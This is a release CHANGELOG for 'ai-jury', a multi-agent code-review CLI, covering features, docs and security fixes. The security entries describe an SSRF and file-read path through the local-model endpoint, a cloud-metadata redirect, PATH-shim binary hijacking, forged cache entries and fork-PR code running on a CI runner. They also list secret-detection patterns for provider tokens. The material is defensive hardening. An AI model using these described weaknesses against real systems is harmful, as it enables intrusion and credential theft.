- **Local-model endpoint is validated and reached over an http(s)-only, redirect-free opener** (#291). The `endpoint` from `jury.toml`/`--local-endpoint` flowed straight into `urllib`, whose default opener honors `file://`/`ftp://` — an SSRF/local-file-read primitive given this tool reviews attacker-controlled PRs/configs. `validate_config` now rejects any non-`http`/`https` scheme (hard error); a **non-loopback host is a hard error by default** and only allowed when the operator opts in via the `JURY_ALLOW_REMOTE_ENDPOINT` env var (kept out of the attacker-controlled config), then degrading to a warning (plus a cleartext warning for plaintext `http`). Every LocalAdapter request goes through an `OpenerDirector` that registers **no file/ftp handlers and no redirect handler**, so non-http(s) URLs raise `URLError` and a `3xx` to an internal/metadata host (e.g. `169.254.169.254`) is never followed — both surfaced after a cross-model jury review of the initial fix.
- **Low-severity hardening bundle** (#293): a **relative-path agent `command`** (`./tools/codex`) is now a config error — use a bare name (PATH) or absolute path, so a binary can't be run from an attacker-influenced relative location (F-6); agent subprocesses are spawned in their **own process group and the whole group is killed on timeout**, so a wrapper CLI can't leak orphaned grandchildren (F-7); the untrusted local-endpoint **error body is redacted** before it reaches the report (F-8); local-model **HTTP responses are capped** at 16 MiB so a malicious endpoint can't OOM the process (F-9); and cache entries now **embed and verify their key** and the cache dir is created **owner-only (0700)**, so another local user can't plant a forged verdict (F-10).
- **Redaction now covers `password=`, `aws_secret_access_key=`, and common provider tokens** (#289, #290). The `secret_assignment` pattern only recognized `api_key`/`secret`/`token` *anchored* at the start of the key, so `password = "…"` was missed entirely and `aws_secret_access_key=…` slipped through (the required `=` followed `_access_key`, not `secret`). The key side now allows surrounding identifier chars (so a keyword embedded mid-name still matches) and includes `password`/`passwd`/`access_key`/`private_key`/`client_secret`/`credential`. Added explicit patterns for Slack (`xox…`), Google (`AIza…`), Stripe (`sk_live_…`/`rk_live_…`), GitHub fine-grained PATs (`github_pat_…`), and JWTs. These ran verbatim into agent prompts and the rendered report before.
- **Cache entries are now MAC-protected and an untrusted cache dir is refused** (#295, follow-up to F-10). Each entry carries a **per-user HMAC-SHA256** keyed by a secret stored `0o600` at `<cache_dir>/.hmac_key`; an entry with a missing or wrong MAC (a forgery, or a legacy pre-MAC entry) is a miss. `store`/`load` also **fail closed** on a group/other-writable cache dir — `store` tightens a dir it owns to `0700` and refuses to write if it can't (no longer silently suppressing the `chmod` failure), and `load` never trusts a world-writable dir. POSIX only (Windows ACLs aren't represented in `st_mode`).
- **Opt-in strict absolute-path agent commands** (#296, follow-up to F-6). Setting `JURY_REQUIRE_ABSOLUTE_COMMAND=1` makes every agent `command` require an **absolute path** — rejecting even a bare name, whose `PATH` resolution an attacker controlling a CI runner's `PATH` could hijack with a shim. Off by default (bare names stay convenient for local use). `--doctor` now also prints the **resolved absolute path** each CLI command maps to, so an operator can verify which binary will run.

## [1.2.0] - 2026-06-05

### Fixed
- **`gh` calls are now time-bounded** (#246). `_gh` and `_gh_with_input` ran `subprocess.run` without a `timeout=`, so a stalled network call or an interactive auth/2FA prompt could hang the whole jury run indefinitely. Both now pass a 90 s ceiling and convert `TimeoutExpired` into a clear, fail-soft `RuntimeError` (`gh … timed out after 90s`), consistent with other gh failures.
- **`redaction_count` no longer inflated for a chunked review with expanded context** (#249). The same context is reviewed against every chunk, so redacting it inside each per-chunk `run_jury` counted its secrets once per chunk and `_merge_chunk_outcomes` summed them (a 1-secret context over 8 chunks reported 8). The context is now redacted **once** in `review_diff` before fan-out and its count added back a single time; per-chunk diff redactions are still counted per chunk (correct, each diff is distinct). Full (non-chunked) reviews are unaffected.
- **Anti-bias: the verification prompt no longer exposes reviewer identities** (#250). `_format_findings_for_verify` emitted `(by {reviewer})`, so the chair could see which agent raised each candidate finding while judging it — a self-preference gap the debate (#37) and synthesis (#38) anonymization already closed, but the verify phase never did. Reviewer attribution is dropped from the verify input (verdicts match back by `file`/`line`/`claim`); the rendered report still attributes every finding by real agent name.

### Added
- **PR descriptions are now enforced, not just templated** (#271). A GitHub PR template only pre-fills the body — it can't stop a PR being opened/merged empty (as #270 was). Added a `Related issues` (`Closes #N`) section to `.github/pull_request_template.md` and a `pr-lint` workflow (`.github/workflows/pr-lint.yml`) that fails a PR whose description has no real summary (< 20 chars of prose, excluding headings/checklists) or no issue reference (`#N`, or an explicit `no issue` opt-out). Pure stdlib Python, reads the body from the event payload via an env var (no shell injection). To make it blocking, add **PR description lint / PR has a real description + linked issue** to the branch-protection required checks (one-time repo setting).
- **Friendly first-impression CLI surface** (#265). Running bare `jury` with no arguments **in a terminal** now prints a compact overview — one line on what it does plus the handful of commands most people use — and exits 0, instead of the argparse error. Non-interactive use (piped/CI) keeps the strict `provide one of --pr/--issue/--diff-file` error + non-zero exit. Adds two argv-intercept subcommands: `jury examples` (common example commands) and `jury guide` (a short end-to-end walkthrough).
- **TL;DR verdict callout at the top of every report.** The report now opens with a one-line `> ⚡ **TL;DR · <verdict>**` callout so the outcome is the first thing a reader sees — above the panel and the full breakdown. The headline is the panel vote's verdict when voting, otherwise the chair's `## Verdict` line lifted verbatim from the synthesis (works for both PR review — APPROVE/COMMENT/REQUEST CHANGES — and issue triage — READY/NEEDS-INFO/UNCLEAR). Purely additive and deterministic: omitted when no verdict is available (failed/absent synthesis), never replacing a section. Report goldens regenerated.

## [1.1.1] - 2026-06-05

### Fixed
- **Credibility-cluster bugs the jury found reviewing its own repo**:
  - #245 — `--fail-on blocker` now fires: `blocker` is normalized to its documented `critical` alias instead of a gate that silently never triggers.
  - #247 — a verifier-**rejected** (`unsupported`) major finding no longer drives a `high` risk level.
  - #248 — the **JSON** report's metadata now reflects an effective `--decision vote` (the JSON path threads `decision`/`vote`, not just markdown).
  - #251 — a reviewer that **abstained** (empty reply or a short refusal) is dropped from a panel vote instead of counting as a 'clear' (APPROVE/READY) vote.
  - #252 — docs (`architecture.md`, `CLAUDE.md`) now match the actual Pages deploy trigger (push to `main`).
  - #253 — corrected the stale `CodexAdapter` comment (shipped default is `-s read-only`).
  - #254 — the release **SBOM** is built from an isolated wheel-only venv (the package + its declared, empty runtime deps), not `cyclonedx-py environment` over the whole runner (`pyproject` is not a valid `cyclonedx-py` subcommand, which would have failed the publish).

### Changed
- **Benchmark: measured the panel's lift over each model, published honestly.** Added `benchmark/sweep.py` — runs each reviewer **solo** vs the **panel** vs the **full jury** over the labeled fixtures (`benchmark/`) — and `docs/benchmark-results.md`. Live v1.1.0 (2026-06-05, 4 vendors: claude/codex/agy + local `qwen2.5-coder:7b`; each cloud reviewer used its CLI's default model at run time, not pinned): run alone, **every** model missed seeded bugs (best 67%, worst 33%, all at 100% precision); the **panel caught 100%** — so **vendor diversity robustly lifts recall**, whichever single you'd have picked. The precision/verification effect is **within noise at N=5** (jury precision varied 1.00↔0.60 between runs) and is **not** claimed. Surfaced on the homepage "Why a panel" section + the README benchmark section; Magpie stays credited in the prior-art/comparison docs (not re-stated on the results page). No sitemap/robots change — docs pages are `docs.html` fragments, not separate URLs.
- **Docs: dropped the stale "MVP" framing.** `feasibility.md` (research grounding) still called the now-shipped v1.1.0 project an "MVP" in the present tense ("this MVP", "MVP run observations", "running the MVP"). Reworded to "first version / v1 / ai-jury" and retitled the run notes "Live-run observations"; the historical research context is unchanged.
- **Docs: broadened the ecosystem comparison & prior art.** Added two categories to `comparison.md` — *host-assistant plugins* (e.g. open-code-review: multi-persona debate inside one host/vendor) and *per-rule CI checks* (e.g. Continue: no cross-agent debate) — and noted Calimero (Anthropic-only consensus) under API-level. README prior-art now cites VulTrial (ICSE 2026), the academic prosecutor/defense/judge/jury approach. Framing verified against each project's own docs.
- **Website: refreshed hero + OG banner art.** Updated `website/assets/` (`hero.svg`/`hero-light.svg`, `hero.png` 2400×1260, `og-banner.png` 1200×630) to the new design and bumped `sitemap.xml` lastmod to 2026-06-05.
- **Taglines now reflect the full scope.** The one-line descriptions in the README, the skill (`SKILL.md`), the plugin manifest, and `positioning.md` said only "review a PR/diff → a chair synthesizes one verdict"; they now read "review a diff, PR, or issue → cross-examine → verify → one verdict, a chair's synthesis **or a panel vote**", matching the shipped feature set.
- **Docs/site: published the full live-run report.** The verbatim Markdown report from the v1.1.0 four-vendor run is now a docs page (`docs/live-review-report.md`, dated *v1.1.0 · 2026-06-04*), registered in the portal and linked from the live-review page and the homepage "Real run" card — every finding/verification/verdict exactly as the tool wrote it. Future re-runs (after fixes) can be added as their own dated reports.
- **README refresh** (closes #255). The **Status** "Shipped" list now includes issue review, chair-or-panel-vote, live play-by-play, full-transcript/verbose, and the `jury init --wizard`; the **CLI compatibility contract** "Stable flags" list was expanded to the full current parser surface (grouped by intent); and the error-message table no longer implies `--post-summary` is PR-only (it posts to `--issue` too).
- **Docs/site: abdication case study.** Expanded the "a reviewer refused, the jury excluded it" moment from the live run into a dedicated `docs/case-study-abdication.md` (registered in the docs portal), linked from `example-live-review.md`, and surfaced as an expandable `<details>` under the homepage "Real run" card. Explains why "no findings" must not be read as APPROVE, and notes the chair-vs-vote nuance (tracked as #251).
- **Website + docs: refreshed the "Real run" with a current v1.1.0 review.** Re-ran the four-vendor panel (Claude, Codex, Antigravity + a free local Qwen) over the whole repo on v1.1.0 (2026-06-04): 8 chunks, 25 verified findings, 6 of the panel's own false positives rejected, 22 secrets redacted. Updated the homepage "Real run" card (date + version + fresh stats/quote) and rewrote `docs/example-live-review.md` with the new findings — including the jury excluding a reviewer that refused to answer rather than scoring the non-answer as a pass.
- **Website hero: distinct issue-verdict colours.** Issue verdicts now read green / amber / indigo (READY / NEEDS-INFO / UNCLEAR) instead of reusing the PR red for NEEDS-INFO — the verdict badge and the animated verdict-stage glow both follow the new palette. Visual-only.
- **Website hero pipeline: PR / Issue mode tabs.** The animated hero pipeline now
  has a `Pull request` / `Issue` tablist — switching modes restarts the loop with
  mode-appropriate scenarios and verdicts (PR: `--pr 123/124/125` →
  APPROVE / REQUEST CHANGES / APPROVE · issue: `--issue 42/43/44` →
  READY / NEEDS-INFO / UNCLEAR), and the input label (`diff / PR` ↔ `issue`) and
  synthesis stage (`chair` ↔ `vote ✓`) follow the active scenario. Adds the
  `.pipe-tabs`/`.pipe-tab` styles and the issue verdict colours
  (`ready`/`needsinfo`/`unclear`) to `styles.css`.
- **Website interactive demo: panel vote now works for issues.** The "Build your
  jury" demo (`website/app.js`) used to force the chair and disable the vote
  option whenever the target was an issue ("n/a for issues") — stale since #230
  shipped issue voting, and contradicting the site's own FAQ. The demo now offers
  panel vote for issues with the mode-aware tally (`NEEDS-INFO > UNCLEAR > READY`,
  majority wins, ties to the stricter stance), emits `--decision vote` in the
  generated command, and shows the per-reviewer ballots + vote footer — matching
  the real CLI. PR-only output toggles (phased / live progress) stay issue-disabled.
- **Docs accuracy sweep across every doc.** Full pass over `docs/`, `README.md`,
  and the checklists fixing stale/incorrect content: README status bumped to
  v1.1.0 and the "no input" error example now lists `--issue`; `feasibility.md`
  no longer calls early-stop / verify / anonymized feedback "roadmap" (all
  shipped); `releasing.md` corrected — trusted publishing is configured and the
  publish step is **not** `continue-on-error`; `release-checklist.md` marks the
  shipped website / hero visual / plugin-matrix items done; `architecture.md`
  clarifies Codex is fed on stdin and that the verdict vocabulary is mode-aware
  (issue verdicts + panel vote); `comparison.md` gains panel-voting and
  issue-review rows; fixed broken in-doc anchors (`#presets`, `#comment-actions`,
  and a benchmark cross-link). No behaviour change.
- **Docs & website: complete the issue / voting / wizard coverage** (#236).
  Corrected PR-only phrasing now that `--post`/`--post-summary` post to issues
  too (via `gh issue comment`): the parameter-reference "GitHub posting" section,
  the cookbook, and the skill doc no longer imply posting requires `--pr`. Added
  the guided wizard (`jury init --wizard`) to the Common recipes and cookbook
  setup; documented `decision = chair|vote` and the mode-aware verdict
  vocabulary (PR `REQUEST CHANGES > COMMENT > APPROVE`; issue `NEEDS-INFO >
  UNCLEAR > READY`) in the Enumerations and configuration behaviour sections. The
  website gains an issue step in the Quickstart, more `--issue` examples under
  "More commands", a `decision` key in the Configuration list, and an
  issue-review FAQ entry (visible + structured-data).

## [1.1.0] - 2026-06-04

### Added
- **Guided init wizard** (#231): `jury init --wizard` runs an opt-in,
  numbered-option setup for the most-used settings (reviewers, depth,
  chair-vs-vote decision, verification, context policy + secret redaction, CI
  gate). Every question is skippable — pressing Enter keeps the built-in
  default — and the wizard writes only the keys you explicitly chose, so the
  generated `jury.toml` stays minimal. Plain `jury init` is unchanged.
- **Live per-step posting for issues** (#229): `jury --issue N --live --post` now
  posts each step to the issue thread as it happens (via `gh issue comment`),
  symmetric with the PR flow. Opt-in (requires `--post`); `--issue --live` alone
  still just streams to the terminal, and `--issue --post` alone still posts one
  summary comment.
- **Panel voting for issues** (#230): `--decision vote` now works with `--issue`
  too. The vote is mode-aware — a diff/PR tallies REQUEST CHANGES > COMMENT >
  APPROVE, an issue tallies **NEEDS-INFO > UNCLEAR > READY** (each reviewer votes
  from the worst gap they raised; majority wins, ties resolve to the stricter
  stance, the chair stays the default). Replaces the previous chair-only fallback.
- **Issue review** (#221): `jury --issue N` reviews a GitHub **issue** for
  completeness and clarity (reproduction steps, expected vs actual, scope /
  acceptance criteria, missing context, actionability) using the same
  multi-agent jury machinery (panel → debate → verify → synthesis) with an
  issue-quality rubric. The verdict vocabulary is **READY / NEEDS-INFO /
  UNCLEAR**. `--post`/`--post-summary` comments back via `gh issue comment`;
  PR/diff-only flags (`--post-inline`, `--post-progress`, `--label`,
  `--incremental`) are rejected for `--issue`.
- **Panel voting verdict** (#220): `--decision vote` (or `[jury] decision = "vote"`)
  derives the final verdict by **tallying the reviewers** instead of letting a single
  chair decide — each reviewer votes from the worst finding they raised
  (critical/major → REQUEST CHANGES, minor/nit → COMMENT, none → APPROVE), majority
  wins, ties resolve to the stricter stance. The report shows the tally + per-reviewer
  ballots as the headline verdict and keeps the chair's synthesis as supporting
  reasoning; the tally is also written to `--metadata-json`. Pure/deterministic and
  rendering-only — it doesn't change orchestration, the cache key, or the
  severity-based `--ci` gate (which stays the independent hard safety check).
- **Live play-by-play** (#210): `--live` streams the deliberation as it happens —
  each reviewer's output, each debate turn, the verification, and the chair's
  decision are emitted the moment they land, instead of only at the end. With
  `--pr` each step is also posted as its own PR comment ("post after post", as if
  watching the jury live). The orchestrator stays pure: it fires an optional
  `on_event(kind, result, round_no)` callback in deterministic per-phase order;
  the CLI does the I/O. PR posting is best-effort and never aborts the run.
- **Full-transcript / verbose output** (#208): `--transcript` renders the whole
  play-by-play — each agent's raw review, the debate exchanges, and the chair's
  decision *and its reasoning* — instead of the consensus-first summary;
  `--verbose` shows the summary followed by the transcript in one document; and
  `[jury] transcript = true` makes the transcript the default (`--no-transcript`
  overrides). It works with `-o FILE` (a shareable Markdown artifact) and posts to
  a PR via the existing `--post` flow. Rendering-only: the orchestration, outcome,
  and cache key are unchanged.

### Changed
- **Example-rich parameter reference, surfaced on the site** (#209): `docs/parameters.md`
  now opens with a **Common recipes** block (copy-pasteable commands for the everyday
  jobs) and carries a worked **Example** for every flag group, with enum values and
  depends-on/conflicts notes spelled out. The docs portal (`website/docs.html`) now
  lists it first under a **Reference** group ("Parameter reference — start here") and
  leads with the practical Reference/Guides over the Overview material, so the flag
  reference is the obvious entry point instead of being invisible.
- The **skill** (`skill/ai-jury/SKILL.md`) now includes a curated **Parameters**
  section (#213) — the common flags grouped by intent (what to review, depth,
  output incl. `--transcript`/`--verbose`/`--live`, PR posting, CI gating, scope)
  with a pointer to the full `docs/parameters.md` reference — so the option surface
  is discoverable when ai-jury is invoked as a Claude Code skill.
- Removed internal `(issue #N)` references from user-facing surfaces (#212): the
  `jury --help` text and the docs pages no longer cite this repo's issue tracker,
  which means nothing to a reader. The `CHANGELOG` and source-code comments keep
  their references for history/developer context.
- **Rebuilt the project website from a fresh design direction** (closes #159).
  New landing page plus dedicated `docs.html`, `coverage.html`,
  `coverage-report.html`, and `404.html`; refreshed favicon set, OG banner, and
  convergence logo mark. `make assets` now also regenerates the favicon set
  from `website/favicon.svg`.
- Wired **Google Analytics 4 (gtag.js)** into the website via
  `website/analytics.js` (loaded from every page's `<head>`). The active GA4
  property is set by `MEASUREMENT_ID` in that file. Scope is website-only —
  the `ai-jury` CLI itself remains telemetry-free.

## [1.0.0] - 2026-06-03

First public release. `ai-jury` orchestrates native coding-agent CLIs (Claude
Code, Codex, Antigravity) plus an optional local/open-weight model to review,
debate, verify, and synthesize one verdict on a diff or PR — stdlib-only, secure
by default, project-agnostic.

### Changed
- **CI runs entirely on GitHub-hosted runners now that the repo is public.** The
  hosted `ci.yml` matrix (ubuntu/macOS/windows × Python 3.11–3.13) plus a
  coverage gate is the authoritative per-push/PR signal, and CodeQL + OpenSSF
  Scorecard run per-commit again. The self-hosted macOS runner and its
  `local-ci.yml` workflow were **removed**: running untrusted forked-PR code on a
  maintainer machine is an arbitrary-code-execution risk, and free public-repo
  minutes make it unnecessary. The website (GitHub Pages) and PyPI publishing
  (OIDC trusted publishing on `v*` tags) are now live.


- The `ai-jury` skill is now a compound, end-to-end flow: scaffold a config
  if needed (`jury init`) → review → capture the report (`-o`) → summarize,
  noting that `jury` already combines review + report in one command. Covers the
  local/open-weight option and add-ons (`--incremental`, `--suggest-patches`,
  `config show`, `--doctor`).
- README and hero visual updated to cover current capabilities (#112): the hero now
  shows the **fourth, local / open-weight** panelist (alongside Claude/Codex/Antigravity)
  and the broader pipeline; the README leads with free/offline reviews, `jury init`,
  and secure-by-default sandboxing, and the Status section reflects shipped features.
- Run metadata schema bumped to v2: adds `stop_reason`, `skipped`, `retried`,
  `budget_exhausted`, `from_cache`, an `execution` block, and per-agent
  `attempts`.

- Public CLI compatibility contract: `tests/test_cli_contract.py` locks the
  CLI's flags, `--help` text (width/color-pinned golden under `tests/golden/`),
  error messages, exit codes, and report headings, with a documented stability
  policy in the README. **Breaking changes to these surfaces require a
  CHANGELOG entry.**

- Multi-version, multi-OS CI test matrix (Python 3.11–3.13 on Linux; 3.13 on
  macOS and Windows) covering unit tests and the mock CLI smoke test.
- OpenSSF Scorecard, CodeQL (Python), and Dependabot automation for supply-chain
  and repository-security signals, plus a documented dependency-update policy.
- Ecosystem comparison & capability matrix (`docs/comparison.md`) positioning the
  project against hosted, API-level, and other native-CLI review tools.
- Agent-readable docs: `llms.txt` (concise) and `llms-full.txt` (full reference).
- Public release readiness checklist (`docs/release-checklist.md`).
- Claude Code plugin distribution: `.claude-plugin/plugin.json` and
  `.claude-plugin/marketplace.json` make the repo installable as a single-plugin
  marketplace, reusing the existing `skill/` without moving it.
- Platform support matrix (`docs/platforms.md`) with honest per-platform statuses
  (supported / manual / planned / out of scope) and install snippets.
- Reusable-skill packaging guide (`docs/skill.md`): directory layout, install into
  Codex/Claude-compatible skill folders, required external tools, skill-to-CLI
  versioning policy, examples, and a smoke-test checklist. Skill behavior changes are
  noted in these release notes alongside the CLI change that motivates them.
- Polished README hero visual (`docs/assets/hero.svg` + rendered `hero.png`) with
  meaningful alt text and the project tagline.
- Static landing site under `website/` (HTML/CSS, no build step) reusing the hero asset,
  plus a GitHub Pages deploy workflow and local-preview/custom-domain instructions.

### Fixed
- Printing the report no longer crashes with `UnicodeEncodeError` on a Windows
  console (legacy cp1252 code page): the CLI now reconfigures stdout/stderr to
  UTF-8 at startup so the report's `🏛️`/`⇄` characters encode cleanly. Surfaced
  by the now-active hosted Windows CI job.


- The result cache key now includes the repository review policy (#122); a
  `--policy` change no longer collides on the same key and serves a stale outcome.
- `config_hash` now covers `anonymize_debate` and `prefer_non_reviewer_chair`
  (#122), so the "same hash ⇒ same orchestration" guarantee (and the cache key)
  holds.
- Inline review posting sends a top-level `body` (#122); GitHub's create-review
  API requires it for a COMMENT event, so `--post-inline` no longer risks a 422.
- docs/security.md least-privilege table corrected to the secure-by-default
  sandboxing (codex `-s read-only`, agy `--sandbox`) — it still described the old
  `danger-full-access` default (#122).
- Secret redaction now scrubs modern OpenAI keys `sk-proj-…` / `sk-svcacct-…` /
  `sk-admin-…` (#122); the old pattern stopped at the first hyphen and would have
  sent them to review agents (no real key actually leaked).
- Removed an accidentally-committed machine-local `cache/projects.json` (local
  paths, no secret) and gitignored `cache/` (#122).
- Secret redaction now preserves the surrounding quotes of a redacted
  assignment (#102), so scrubbing a secret-fixture file keeps it a valid string
  literal instead of fabricating phantom "syntax error" findings for reviewers.
- A reviewer CLI that exits **nonzero** is now always treated as a failure, even
  when it printed to stdout (#101); partial/error output no longer silently
  counts as a clean review feeding consensus, synthesis, and the CI gate.
- Result cache key now includes the `--mock` flag, so a mock run can never be
  served as a real review (or vice versa) for the same diff+config.
- `total_timeout` now bounds a whole **chunked** review instead of resetting per
  chunk: `review_diff` threads one shared budget through every chunk's
  `run_jury` (which gained an optional `budget` parameter).
- The structured-findings report no longer crashes (`TypeError`) when two
  same-severity findings include one with no `file`/`line`; the sort key is
  None-safe.
- Self-hosted CI (`local-ci.yml`) no longer runs untrusted **forked-PR** code on
  the self-hosted runner — both jobs are guarded to same-repo pushes/PRs,
  closing an arbitrary-code-execution exposure on the runner host.
- Large-diff binary detection (#31) no longer misclassifies a *source* file as
  binary just because its content mentions `Binary files` / `GIT binary patch`;
  it now matches only the diff's unprefixed binary-marker header line.
- `jury --doctor` reports local/open-weight agents (#43) by their endpoint
  reachability instead of a (non-existent) CLI on PATH, so a reachable local
  server no longer shows as `MISSING`.

### Security
- Secure-by-default agent sandboxing (#100): the shipped reviewer defaults no
  longer grant broad powers while reading untrusted PR content. `codex` now runs
  `-s read-only` (was `danger-full-access`) — the diff is fetched by the jury,
  not the agent, so the reviewer needs no write/network; `agy` now runs
  `--sandbox`; `claude` keeps its write-tool denylist. The least-privilege audit
  recognizes a sandbox as a mitigation, and the shipped defaults raise no
  warnings. Widen a sandbox only if your workflow needs it.

### Added
- Published **test-coverage report + badge** on the project site (no external
  service): the Pages deploy runs the suite under coverage, publishes a
  browsable HTML report at `/coverage/`, and writes a shields-endpoint badge
  (`coverage-badge.json`) shown in the README and site badge row. Statement+branch
  coverage is **95%**, with every module ≥90%.
- The consensus section now shows each finding's supporting **evidence** (the
  reviewer's "why"), so a verdict is auditable rather than just asserted.
- `--post-mode {single,phased}` (#127): with `--post-summary`, post the review as
  one comment (default) or as separate **Round 1 / Debate / Decision** comments,
  so the flow (each reviewer's findings → cross-examination → verdict & why) is
  easy to follow. Pairs with `--post-progress` for live stage tracking.
- `--post-progress` (#125): keeps a single, sticky status comment on the PR,
  updated live at each round/chunk milestone (round 1 → debate → verify →
  synthesis; chunk i/N), then replaced with the final verdict. Off by default;
  requires `--pr`; best-effort (a GitHub hiccup never crashes the run).
- Risk-aware auto-depth (#120): `--auto` / `[jury] auto_depth` scales review
  intensity to a cheap pre-review diff profile (size / files / docs-or-generated
  / security-sensitive paths) — a trivial or docs-only diff runs shallow
  (`rounds=1`, no verify) while a large or security-touching diff runs full.
  The panel (vendor diversity) is never trimmed; explicit `--rounds`/`--verify`/
  `--early-stop` override it; the chosen depth is logged.
- `jury init --preset offline|fast|balanced|thorough` — one-command setup for
  common intents (offline = free local-only; fast = 1 round; balanced = debate +
  early-stop; thorough = all agents + debate + verify). Explicit flags override
  the preset's defaults.
- Smart offline fallback: with no config file, no available agent CLI, and a
  reachable local model server, `jury` automatically adds a local agent so it
  works offline out of the box (never overrides an explicit config or a working
  CLI panel).
- `jury config show` / `jury config path` print the **effective resolved
  config** (and its source file) so you can see exactly what a run will use.
- `jury --doctor` now ends with a **Next steps** section: a `ready to run:
  yes/no` verdict plus actionable fixes (scaffold a config, install a CLI, or use
  a reachable local model).
- `jury init` scaffolds a `jury.toml` (#107): detects which agent CLIs are
  available and writes a valid config from interactive prompts or flags
  (`--agents claude,codex,qwen --rounds 2`), using the secure-by-default agent
  templates. `--list-agents` shows availability; existing files are not
  overwritten without `--force`.
- `jury init` discovers **local (Ollama/OpenAI-compatible) models** (#109):
  the interactive flow lists the models on your server and lets you pick one
  (preferring a coder model); `jury init --list-models` prints them. Falls
  back gracefully to a typed default when no server is reachable.
- Local / open-weight reviewer (#43): a new `vendor = "local"` agent talks to any
  OpenAI-compatible server (Ollama, llama.cpp, vLLM, LM Studio) over plain HTTP
  via the stdlib — no new dependencies, no subprocess. Configure with an
  `endpoint` (default `http://localhost:11434/v1`) and a `model`; it participates
  in every round and the consensus like a CLI agent, adding vendor diversity at
  zero marginal cost and enabling fully offline reviews. An unreachable server
  fails with the typed `connection_error` code. README + benchmark note document
  one concrete setup (Ollama) and the cost/quality trade-off.

- Release provenance, checksums, and SBOM (#25): the publish workflow now emits a
  `SHA256SUMS` checksum file, a CycloneDX SBOM (`sbom.cdx.json`), and a signed
  build-provenance attestation, and publishes to PyPI via trusted publishing
  (OIDC, no long-lived token). New `docs/releasing.md` documents how artifacts
  are built and verified (`sha256sum -c`, `gh attestation verify`); the release
  checklist references it.

- Incremental review mode (#9): `--incremental` reviews only the diff since the
  last jury run on a PR (the reviewed head SHA is recorded as a hidden marker
  on the summary comment), falling back to a full review when no prior marker
  exists or the head is unchanged. The report states the review scope.
- Suggested patches (#10): `--suggest-patches` emits a separate, opt-in
  suggested-patches section for **verified** findings only — read-only, never
  applied automatically. `--patches-out PATH` writes them to a file instead.
- GitHub comment commands (#11): a `jury comment --text "/jury review …"`
  mode parses allowlisted PR-comment commands (`review`, `summary`; `--rounds`
  only) into a safe jury run — comment text never reaches a shell. Includes a
  documented, author-gated GitHub Actions recipe in the cookbook.
- Run budget, retries, and partial-result policy (#30): optional `total_timeout`
  / `phase_timeout` budgets and opt-in `retries` for transient
  (timeout/rate-limit/spawn) failures. The effective per-call timeout is the min
  of the agent timeout and the budgets; skipped/failed/retried/timed-out agents
  are surfaced in the report and run metadata; `Ctrl-C` exits cleanly (130). CLI:
  `--total-timeout`, `--phase-timeout`, `--retries`.
- Convergence-based early stop / adaptive debate rounds (#40): with
  `early_stop = true`, a unanimous round-1 panel skips the debate and
  disagreement runs debate up to `max_rounds`, stopping when disputes resolve.
  Rounds executed and the stop reason appear in logs and metadata. A fixed
  `--rounds` keeps reproducible fixed-N behaviour. CLI: `--early-stop` /
  `--no-early-stop`, `--max-rounds`.
- Large-diff handling (#31): the diff is measured and filtered (binary,
  generated/vendored files, and `[jury.diff]` include/exclude globs) before
  review; an over-budget diff is chunked by file (`chunk = true`) or rejected
  with an actionable message. CLI reports size and the selected mode. CLI:
  `--max-diff-bytes`, `--chunk` / `--no-chunk`, `--exclude`, `--include`.
- Optional local result cache (#33): `--cache` reuses a stored outcome for an
  unchanged diff+config (key covers diff, config hash, prompt version, package
  version, context policy, seed) and stores on a miss; cache hits are marked in
  logs and metadata. Clear with `jury cache clear` or `--clear-cache`.
  Privacy implications documented in `docs/configuration.md`.
- Maintainer governance (#26): `MAINTAINERS.md` documents triage labels, release
  cadence, the compatibility/deprecation policy, decision-making, security
  routing, and how project-specific requests are handled; linked from
  CONTRIBUTING.

## [0.1.0] - 2026-05-30

### Added
- Initial project-agnostic release of the cross-vendor review jury.
- Native CLI adapters for Claude Code, Codex CLI, and Antigravity.
- Review, debate, and synthesis orchestration pipeline.
- Offline mock mode with unit tests and CLI smoke coverage.
- GitHub PR diff input and optional PR comment output through the GitHub CLI.
- Bundled Claude Code skill for invoking the jury from another project.

